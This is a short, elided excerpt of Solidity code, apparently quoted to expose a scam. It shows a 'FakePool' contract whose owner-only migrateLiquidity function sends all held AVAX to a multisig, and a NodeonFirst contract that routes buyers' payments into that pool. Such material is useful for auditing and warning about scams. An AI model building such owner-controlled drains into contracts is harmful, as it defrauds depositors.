...
contract FakePool is Ownable {
    ...
    address Token = 0xAD4715E16aBe7FdB93750788957C061FEDc4850C;
    ...
    function migrateLiquidity() public onlyOwner {
        TransferHelper.safeTransferAVAX(multisig, address(this).balance);
...
contract NodeonFirst is Ownable {
    ...
    address FAKE = 0x6dfCB957b31BFd33345d4ab3240fA3Aad33809D9;
    ...
    function buyNodeAVAX(uint _amount) public payable {
        ...
        fake.deposit{value: priceAVAX * percentLiquidity / 205}();
